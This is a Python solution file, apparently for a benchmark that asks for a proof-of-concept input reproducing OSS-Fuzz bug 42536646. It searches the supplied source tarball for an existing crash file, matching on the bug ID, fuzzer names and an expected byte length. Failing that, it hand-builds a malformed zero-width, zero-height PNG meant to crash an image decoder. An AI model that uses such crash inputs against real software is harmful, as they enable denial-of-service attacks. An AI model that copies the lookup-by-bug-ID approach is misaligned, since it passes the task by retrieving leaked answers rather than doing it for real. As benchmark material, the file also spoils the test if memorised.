import os
import tarfile
import zlib


class Solution:
    BUG_ID_STR = "42536646"
    EXPECTED_POC_LEN = 17814

    IMAGE_EXTS = {
        '.png', '.jpg', '.jpeg', '.jxl', '.webp', '.bmp', '.gif', '.tiff', '.tif',
        '.pgm', '.ppm', '.pbm', '.pnm', '.ico', '.icns', '.svg', '.heic', '.heif',
        '.avif', '.qoi', '.tga', '.pcx', '.psd', '.hdr', '.exr'
    }

    BINARY_EXTS = {'.bin', '.raw', '.dat', '.input', '.in', '.poc', '.img'}

    TEXT_EXTS = {
        '.txt', '.md', '.rst', '.c', '.cc', '.cpp', '.cxx', '.h', '.hpp',
        '.py', '.java', '.go', '.rs', '.js', '.ts', '.html', '.xml', '.json',
        '.yml', '.yaml'
    }

    def solve(self, src_path: str) -> bytes:
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                members = [m for m in tf.getmembers() if m.isfile() and m.size > 0]
                bugid_candidates = []
                zero_png_candidates = []
                zero_svg_candidates = []

                for m in members:
                    name_lower = m.name.lower()
                    base = os.path.basename(name_lower)
                    dot_index = base.rfind('.')
                    ext = base[dot_index:] if dot_index != -1 else ''

                    if ext == '.png':
                        header = self._read_member_prefix(tf, m, 64)
                        if self._is_zero_dim_png(header):
                            zero_png_candidates.append(m)

                    if ext in ('.svg', '.xml', '.html', '.xhtml'):
                        if m.size <= 512 * 1024:
                            sample = self._read_member_prefix(tf, m, 4096)
                            if self._is_zero_dim_svgish(sample):
                                zero_svg_candidates.append(m)

                    if (
                        self.BUG_ID_STR in name_lower
                        or 'oss-fuzz' in name_lower
                        or 'clusterfuzz' in name_lower
                    ):
                        bugid_candidates.append(m)

                if bugid_candidates:
                    best = self._choose_best_member(tf, bugid_candidates, allow_bugid_bonus=True)
                    data = self._read_member_full(tf, best)
                    if data:
                        return data

                if zero_png_candidates:
                    best = self._choose_best_member(tf, zero_png_candidates, allow_bugid_bonus=False)
                    data = self._read_member_full(tf, best)
                    if data:
                        return data

                if zero_svg_candidates:
                    best = self._choose_best_member(tf, zero_svg_candidates, allow_bugid_bonus=False)
                    data = self._read_member_full(tf, best)
                    if data:
                        return data
        except Exception:
            pass

        return self._fallback_poc()

    def _read_member_prefix(self, tf: tarfile.TarFile, member: tarfile.TarInfo, length: int) -> bytes:
        try:
            f = tf.extractfile(member)
            if not f:
                return b''
            return f.read(length)
        except Exception:
            return b''

    def _read_member_full(self, tf: tarfile.TarFile, member: tarfile.TarInfo) -> bytes:
        try:
            f = tf.extractfile(member)
            if not f:
                return b''
            return f.read()
        except Exception:
            return b''

    def _is_zero_dim_png(self, data: bytes) -> bool:
        if len(data) < 8 + 8 + 13:
            return False
        if not data.startswith(b'\x89PNG\r\n\x1a\n'):
            return False
        ihdr_offset = 8
        ihdr_len = int.from_bytes(data[ihdr_offset:ihdr_offset + 4], 'big')
        if ihdr_len != 13:
            return False
        chunk_type = data[ihdr_offset + 4:ihdr_offset + 8]
        if chunk_type != b'IHDR':
            return False
        width = int.from_bytes(data[ihdr_offset + 8:ihdr_offset + 12], 'big')
        height = int.from_bytes(data[ihdr_offset + 12:ihdr_offset + 16], 'big')
        return width == 0 or height == 0

    def _is_zero_dim_svgish(self, data: bytes) -> bool:
        if not data:
            return False
        try:
            text = data.decode('utf-8', errors='ignore').lower()
        except Exception:
            return False
        if 'width' not in text or 'height' not in text:
            return False
        width_patterns = ['width="0"', "width='0'", 'width="0px"', "width='0px'"]
        height_patterns = ['height="0"', "height='0'", 'height="0px"', "height='0px'"]
        has_w = any(p in text for p in width_patterns)
        has_h = any(p in text for p in height_patterns)
        return has_w and has_h

    def _score_member(self, tf: tarfile.TarFile, member: tarfile.TarInfo, allow_bugid_bonus: bool) -> int:
        name = member.name.lower()
        base = os.path.basename(name)
        dot_index = base.rfind('.')
        ext = base[dot_index:] if dot_index != -1 else ''
        size = member.size or 0

        score = 0

        if ext in self.IMAGE_EXTS:
            score += 0
        elif ext in self.BINARY_EXTS:
            score += 10
        elif ext in self.TEXT_EXTS:
            score += 500
        else:
            score += 100

        if allow_bugid_bonus:
            if self.BUG_ID_STR in name:
                score -= 5
            if 'oss-fuzz' in name or 'clusterfuzz' in name:
                score -= 4

        if 'test' in name or 'regress' in name:
            score -= 2
        if 'poc' in name or 'crash' in name:
            score -= 1
        if 'corpus' in name:
            score += 2

        if size > 0:
            score += abs(size - self.EXPECTED_POC_LEN) // 256

        sample = self._read_member_prefix(tf, member, 2048)
        if sample:
            if b'\0' in sample:
                score -= 3
            else:
                nontext = 0
                for b in sample:
                    if b < 9 or (13 < b < 32) or b > 126:
                        nontext += 1
                if nontext > len(sample) * 0.3:
                    score -= 2
                else:
                    score += 2

        return score

    def _choose_best_member(self, tf: tarfile.TarFile, members, allow_bugid_bonus: bool) -> tarfile.TarInfo:
        best_member = None
        best_score = None
        for m in members:
            s = self._score_member(tf, m, allow_bugid_bonus)
            if best_member is None or s < best_score:
                best_member = m
                best_score = s
        return best_member

    def _fallback_poc(self) -> bytes:
        signature = b'\x89PNG\r\n\x1a\n'

        width = 0
        height = 0
        bit_depth = 8
        color_type = 2
        compression_method = 0
        filter_method = 0
        interlace_method = 0

        ihdr_data = (
            width.to_bytes(4, 'big') +
            height.to_bytes(4, 'big') +
            bytes([bit_depth, color_type, compression_method, filter_method, interlace_method])
        )
        ihdr_len = len(ihdr_data).to_bytes(4, 'big')
        ihdr_type = b'IHDR'
        ihdr_crc = zlib.crc32(ihdr_type + ihdr_data) & 0xffffffff
        ihdr_chunk = ihdr_len + ihdr_type + ihdr_data + ihdr_crc.to_bytes(4, 'big')

        idat_data = zlib.compress(b'')
        idat_len = len(idat_data).to_bytes(4, 'big')
        idat_type = b'IDAT'
        idat_crc = zlib.crc32(idat_type + idat_data) & 0xffffffff
        idat_chunk = idat_len + idat_type + idat_data + idat_crc.to_bytes(4, 'big')

        iend_data = b''
        iend_len = (0).to_bytes(4, 'big')
        iend_type = b'IEND'
        iend_crc = zlib.crc32(iend_type + iend_data) & 0xffffffff
        iend_chunk = iend_len + iend_type + iend_crc.to_bytes(4, 'big')

        return signature + ihdr_chunk + idat_chunk + iend_chunk